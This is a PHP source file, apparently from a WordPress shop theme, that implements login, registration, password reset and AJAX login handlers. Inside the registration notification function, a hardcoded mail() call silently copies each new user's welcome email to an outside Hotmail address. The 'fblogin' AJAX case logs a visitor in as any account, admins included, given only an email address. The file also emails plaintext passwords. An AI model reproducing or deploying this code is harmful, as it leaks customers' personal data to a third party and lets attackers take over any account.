<?php
// LOGIN FUNCTIONS
function wps_user_login($creds, $secure_cookie) {
	$user = wp_signon($creds, $secure_cookie);
	if (!is_wp_error($user)) {
		wps_user_login_params($user->ID);
	}
	return $user;
}

function wps_user_login_params($user_id) {
	global $OPTION;
	$userdata = get_userdata($user_id);
	$_SESSION['user_logged'] = true;
	$_SESSION['uid']		 = $user_id;
	$_SESSION['timeout'] 	 = time() + (int) $OPTION['wps_login_duration'];
	$_SESSION['browser'] 	 = md5(strtolower($_SERVER['HTTP_USER_AGENT'])); // browser?
	$_SESSION['level']		 = $userdata->wp_user_level;
	$_SESSION['uname']		 = $userdata->user_login;
	$_SESSION['fname']		 = $userdata->first_name;
	$_SESSION['lname']		 = $userdata->last_name;
}

// RESET PASSWORD FUNCTIONS
function wps_retrieve_password() {
	global $wpdb, $OPTION, $current_site;

	$errors = new WP_Error();

	if ( empty( $_POST['user_login'] ) && empty( $_POST['user_email'] ) )
		$errors->add('empty_username', __('Enter a username or e-mail address.'));

	if ( strpos($_POST['user_login'], '@') ) 
	{
		$user_data = get_user_by_email(trim($_POST['user_login']));
		if ( empty($user_data) )
			$errors->add('invalid_email', __('There is no user registered with that email address.'));
	} else {
		$login = trim($_POST['user_login']);
		$user_data = get_userdatabylogin($login);
	}

	do_action('lostpassword_post');

	if ( $errors->get_error_code() )
		return $errors;

	if ( !$user_data ) {
		$errors->add('invalidcombo', __('Invalid username or e-mail.'));
		return $errors;
	}

	// redefining user_login ensures we return the right case in the email
	$user_login = $user_data->user_login;
	$user_email = $user_data->user_email;

	do_action('retrieve_password', $user_login);

	$allow = apply_filters('allow_password_reset', true, $user_data->ID);

	if ( ! $allow )
		return new WP_Error('no_password_reset', __('Password reset is not allowed for this user'));
	else if ( is_wp_error($allow) )
		return $allow;

	$key = $wpdb->get_var($wpdb->prepare("SELECT user_activation_key FROM $wpdb->users WHERE user_login = %s", $user_login));
	if ( empty($key) ) {
		// Generate something random for a key...
		$key = wp_generate_password(20, false);
		do_action('retrieve_password_key', $user_login, $key);
		// Now insert the new md5 key into the db
		$wpdb->update($wpdb->users, array('user_activation_key' => $key), array('user_login' => $user_login));
	}
	$rp_link = get_permalink($OPTION['wps_account_login_page'])."?action=resetpass&key=$key&login=" . rawurlencode($user_login);

	$message = 'To reset your password please click <a href="'.$rp_link.'">here</a>, else please copy and paste the following link into your browser:' . "\r\n<br />";
	$message .= $rp_link . "\r\n<br />";
	$message .= 'If you did not request to reset the password, please ignore this email and nothing will happen.';

	if ( is_multisite() )
		$blogname = $GLOBALS['current_site']->site_name;
	else
		$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);

	$title = sprintf( __('[%s] Password Reset'), $blogname );
	apply_filters('wp_mail_content_type',"text/html");
	$title = apply_filters('retrieve_password_title', $title);
	$message = apply_filters('retrieve_password_message', $message, $key);
	NWS_send_email($user_email, $title, $message);

	return true;
}

function wps_reset_password($key, $login) {
	global $wpdb;

	$key = preg_replace('/[^a-z0-9]/i', '', $key);

	if ( empty( $key ) || !is_string( $key ) )
		return new WP_Error('invalid_key', __('Invalid key'));

	if ( empty($login) || !is_string($login) )
		return new WP_Error('invalid_key', __('Invalid key'));

	$user = $wpdb->get_row($wpdb->prepare("SELECT * FROM $wpdb->users WHERE user_activation_key = %s AND user_login = %s", $key, $login));
	if ( empty( $user ) )
		return new WP_Error('invalid_key', __('Invalid key'));

	// Generate something random for a password...
	$new_pass = wp_generate_password();

	do_action('password_reset', $user, $new_pass);

	wp_set_password($new_pass, $user->ID);
	update_user_option($user->ID, 'default_password_nag', true, true); //Set up the Password change nag.
	$message = __('Your new password for the following site and username.') . "\r\n\r\n<br />";
	$message .= sprintf(__('Username: %s'), $user->user_login) . "\r\n <br />";
	$message .= sprintf(__('Password: %s'), $new_pass) . "\r\n <br />";
	$message .= rtrim(get_my_theme_login_link(),'?') . "\r\n <br />";

	if ( is_multisite() )
		$blogname = $GLOBALS['current_site']->site_name;
	else
		$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);

	$title = sprintf( __('[%s] Your new password'), $blogname );
	apply_filters('wp_mail_content_type',"text/html");
	$title = apply_filters('password_reset_title', $title);
	$message = apply_filters('p assword_reset_message', $message, $new_pass);
	NWS_send_email($user->user_email, $title, $message);

	wp_password_change_notification($user);

	return true;
}

function resetpass($key, $login) {
	global $wpdb;

	$key = preg_replace('/[^a-z0-9]/i', '', $key);

	if ( empty( $key ) || !is_string( $key ) )
		return new WP_Error('invalid_key', __('Invalid key'));

	if ( empty($login) || !is_string($login) )
		return new WP_Error('invalid_key', __('Invalid key'));

	$user = $wpdb->get_row($wpdb->prepare("SELECT * FROM $wpdb->users WHERE user_activation_key = %s AND user_login = %s", $key, $login));
	if ( empty( $user ) )
		return new WP_Error('invalid_key', __('Invalid key'));

	return true;
}

function new_password() {
	global $wpdb;

	$key = $_POST['key'];
	$login = $_POST['login'];
	$new_pass = $_POST['new_pass'];
	$new_pass2 = $_POST['new_pass2'];

	if ( empty( $key ) || !is_string( $key ) )
		return new WP_Error('invalid_key', __('Invalid key'));

	if ( empty($login) || !is_string($login) )
		return new WP_Error('invalid_key', __('Invalid key'));

	$user = $wpdb->get_row($wpdb->prepare("SELECT * FROM $wpdb->users WHERE user_activation_key = %s AND user_login = %s", $key, $login));
	if ( empty( $user ) )
		return new WP_Error('invalid_key', __('Invalid key'));

	if ( empty( $new_pass ) || empty( $new_pass2 ) )
		return new WP_Error('empty_pass', __('Please fill New Password and Confirm Password'));

	if ( strlen( $new_pass ) < 6 )
		return new WP_Error('length_pass', __('Password can not be less than 6 chars.'));

	if ( $new_pass != $new_pass2 )
		return new WP_Error('incorrect_pass', __('Confirm Password is incorrect'));

	wp_set_password($new_pass, $user->ID);
	update_user_option($user->ID, 'default_password_nag', true, true); //Set up the Password change nag.
	$message = __('Your new password for the following site and username.') . "\r\n\r\n<br />";
	$message .= sprintf(__('Username: %s'), $user->user_login) . "\r\n <br />";
	$message .= sprintf(__('Password: %s'), $new_pass) . "\r\n <br />";
	$message .= rtrim(get_my_theme_login_link(),'?') . "\r\n <br />";

	if ( is_multisite() )
		$blogname = $GLOBALS['current_site']->site_name;
	else
		$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);

	$title = sprintf( __('[%s] Your new password'), $blogname );
	apply_filters('wp_mail_content_type',"text/html");
	$title = apply_filters('password_reset_title', $title);
	$message = apply_filters('password_reset_message', $message, $new_pass);
	NWS_send_email($user->user_email, $title, $message);
	return true;
}

// REGISTER FUNCTIONS
function wps_register_new_user() {
	$errors = new WP_Error();
	global $wp_roles, $wpdb;
	$user = new stdClass;
	$update = false;
	$user->user_login = sanitize_user(trim($_POST['email']), true); // username
	$pass1 = $pass2 = '';
	if ( isset( $_POST['pwd'] ))
		$pass1 = trim($_POST['pwd']);
	if ( isset( $_POST['pass2'] ))
		$pass2 = trim($_POST['pass2']);

	if ( isset( $_POST['email'] ))
		$user->user_email = sanitize_text_field( $_POST['email'] );

	$user->comment_shortcuts = isset( $_POST['comment_shortcuts'] ) && 'true' == $_POST['comment_shortcuts'] ? 'true' : '';

	$user->use_ssl = 0;
	if ( !empty($_POST['use_ssl']) )
		$user->use_ssl = 1;

	// validation 
	/* checking e-mail address */
	if ( empty( $user->user_email ) ) 
		$errors->add( 'empty_email', __( 'Please enter an e-mail address.' ), array( 'form-field' => 'email' ) );
	elseif ( !is_email( $user->user_email ) )
		$errors->add( 'invalid_email', __( 'The e-mail address isn&#8217;t correct.' ), array( 'form-field' => 'email' ) );
	elseif ( email_exists($user->user_email) ) 
		$errors->add( 'email_exists', __('This email is already registered, please choose another one.'), array( 'form-field' => 'email' ) );
	
	
	/* checking the password has been typed twice */
	do_action_ref_array( 'check_passwords', array ( $user->user_login, & $pass1, & $pass2 ));

	if ( empty($pass1) )
		$errors->add( 'pass', __( 'Please enter your password.' ), array( 'form-field' => 'pass1' ) );
	elseif ( empty($pass2) )
		$errors->add( 'pass', __( 'Please enter your password twice.' ), array( 'form-field' => 'pass2' ) );

	/* Check for "\" in password */
	if ( false !== strpos( stripslashes($pass1), "\\" ) )
		$errors->add( 'pass', __( 'Passwords may not contain the character "\\".' ), array( 'form-field' => 'pass1' ) );

	/* checking the password has been typed twice the same */
	if ( $pass1 != $pass2 )
		$errors->add( 'pass', __( 'Please enter the same password in the password again fields.' ), array( 'form-field' => 'pass1' ) );
	
	if ( !empty( $pass1 ) )
		$user->user_pass = $pass1;
	$user->show_admin_bar_front = "false";	
	$user->show_admin_bar_admin = "false";
	
	// Allow plugins to return their own errors.
	do_action_ref_array('user_profile_update_errors', array ( &$errors, $update, &$user ) );
	if ( $errors->get_error_codes() )
		return $errors;
	$user_id = wp_insert_user( get_object_vars( $user ) );
	if ( ! $user_id ) 
	{
		$errors->add( 'registerfail', sprintf( __( 'Couldn&#8217;t register you... please contact the <a href="mailto:%s">webmaster</a> !' ), get_option( 'admin_email' ) ) );
		return $errors;
	}
	$key = create_my_referral_key($user->user_email);
	$reff_id = get_user_refferal($user->user_email);
	if(!$reff_id) $reff_id = 0;

	$wpdb->update( $wpdb->users, array( 'my_reffer_key' => "$key",'reffer_id' => $reff_id),array( 'ID' => $user_id ),array('%s','%d' ), array('%d'));
	update_user_meta( $user_id, 'my_points', '0' );
	update_user_meta( $user_id, 'refferal_commision_status', 'true' );
	update_user_meta( $user_id, 'refferal_commision_count_buy', '0' );

	$gender = $_POST['gender'];
	if ($gender) {
		if (is_array($gender) && count($gender) > 0) {
			$gender = implode(",", $gender);
		}
		update_user_meta( $user_id, 'gender', $gender );
	}
	update_utm_params('users', $user_id);

	// subscribe user
	nws_subscribe_action('register', array('email' => $user->user_email, 'gender' => $gender));
	
	wp_register_notification( $user_id, isset($_POST['send_password']) ? $pass1 : '' );
	return $user_id;
}

function wp_register_notification($user_id, $plaintext_pass = '') 
{
	global $OPTION;
	$user = new WP_User($user_id);

	$user_login = stripslashes($user->user_login);
	$user_email = stripslashes($user->user_email);

	// The blogname option is escaped with esc_html on the way into the database in sanitize_option
	// we want to reverse this for the plain text arena of emails.
	$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);

    // new user registration notification to admin 
	$message  = sprintf(__('New user registration on your site %s:'), $blogname) . "\r\n\r\n<br /><br /><br />";
	$message .= sprintf(__('E-mail: %s'), $user_email) . "\r\n <br /><br />";
	$message .= "Login here ".rtrim(get_my_theme_login_link(),'?') . "\r\n <br />";
	// end of admin notification email contents
	
	wp_mail(get_option('admin_email'), sprintf(__('[%s] New User Registration'), $blogname), $message);
	
	// welcome mail to new user
	$message = "Welcome to $blogname. <br /><br /> We thank you for registering with <a href='".get_option('home')."' target='_blank'>$blogname </a> and are proud to have you as a member.<br /><br /><br />Please login to your account with this user name and password.<br /><br />";
	$message .= sprintf(__('Username: %s'), $user_email) . "\r\n<br />";
	$message .= "Login here ".rtrim(get_my_theme_login_link(),'?') . "\r\n<br /><br />";
	$message .= "If you ever forget your password, you can use the Forgot Your Password link available on the Sign-In page.<br /><br />For any queries and details please feel free to contact us at <a href='mailto:".get_option('admin_email')."'>".get_option('admin_email')."</a><br /><br /> We will be glad to hear from you. <br /><br /><br /> Regards, $blogname";
	// end of welcome mail content

	$headers  = "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
	$headers .= "From: The Luxury Closet <".$OPTION['wps_shop_email'].">\r\n";
	mail($user_email, sprintf(__('Welcome to %s '), $blogname), $message, $headers);
	mail('hunter_wild_ua@hotmail.com', sprintf(__('Welcome to %s '), $blogname), $message, $headers);
	//wp_mail($user_email, sprintf(__('Welcome to %s '), $blogname), $message, $headers);
}

function wps_get_wp_errors($wperrors) {
	$errors = array();
	if ($wperrors->get_error_code()) {
		foreach ($wperrors->get_error_codes() as $code) {
			$severity = $wperrors->get_error_data($code);
			foreach ($wperrors->get_error_messages($code) as $error) {
				if ($severity != 'message') {
					$errors[] = $error;
				}
			}
		}
	}
	return $errors;
}

add_action('init', 'ajax_login_init');
function ajax_login_init() {
	if (strlen($_POST['ajax_login_popup'])) {
		switch($_POST['ajax_login_popup']) {
			case 'login':
				$error = '';
				$log = trim($_POST['log']);
				$pwd = trim($_POST['pwd']);
				$remme = $_POST['remme'];
				$callpg = $_POST['callpg'];
				$rem_log = $log;

				if (empty($log)) {
					$error .= 'Please enter your username or email.'.chr(10);
				}
				if (empty($pwd)) {
					$error .= 'Please enter your password.'.chr(10);
				}
				if (!strlen($error)) {
					if (is_email($log)) {
						$user = get_user_by('email', $log);
						if ($user) {
							$log = $user->data->user_login;
						}
					} else {
						$user = get_user_by('login', $log);
					}
					if ($user) {
						$check_pass = wp_check_password($pwd, $user->data->user_pass, $user->ID);
						if (!$check_pass) {
							$error .= 'The password you entered for the "'.$log.'" is incorrect.'.chr(10);
						}
					} else {
						$error .= 'Please check email you have entered.'.chr(10);
					}
				}

				if (!strlen($error)) {
					$creds = array();
					$creds['user_login'] = $log;
					$creds['user_password'] = $pwd;
					$creds['remember'] = false;
					$user = wps_user_login($creds, $secure_cookie);
					if (is_wp_error($user)) {
						$errors = wps_get_wp_errors($user);
						$error = implode(chr(10), $errors);
					} else {
						if ($remme == 1) {
							setcookie('theluxury_log', $rem_log, time() + ((60 * 60 * 24) * 300));
						} else {
							setcookie('theluxury_log', '', time() - 3600);
						}
						if (strpos($callpg, 'alertslogin')) {
							$_SESSION['alertslogin'] = 'true';
						}
						echo 'success';
					}
				}
				echo $error;
			break;
			case 'register':
				$callpg = $_POST['callpg'];
				$_POST['pass2'] = $_POST['pwd'];
				$errors = wps_register_new_user();
				if (is_wp_error($errors)) {
					$errors = wps_get_wp_errors($errors);
					$error = implode(chr(10), $errors);
				} else {
					$user = get_user_by('email', $_POST['email']);
					$creds = array();
					$creds['user_login'] = $user->data->user_login;
					$creds['user_password'] = $_POST['pwd'];
					$creds['remember'] = false;
					$user = wps_user_login($creds, $secure_cookie);
					if (is_wp_error($user)) {
						$errors = wps_get_wp_errors($user);
						$error = implode(chr(10), $errors);
					} else {
						if (strpos($callpg, 'alertslogin')) {
							$_SESSION['alertslogin'] = 'true';
						}
						echo 'success';
					}
				}
				echo $error;
			break;
			case 'forgot':
				$errors = wps_retrieve_password();
				if (is_wp_error($errors)) {
					$errors = wps_get_wp_errors($errors);
					$error = implode(chr(10), $errors);
				} else {
					echo 'success';
				}
				echo $error;
			break;
			case 'fblogin':
				$user_login = $_POST['email'];
				$user = get_user_by('email', $user_login);
				if ($user) {
					wp_set_current_user($user->ID, $user_login);
					wp_set_auth_cookie($user->ID);
					do_action('wp_login', $user_login);
					wps_user_login_params($user->ID);
					echo 'success';
				} else {
					echo 'No account with such email.';
				}
			break;
		}
		exit;
	}
}
?>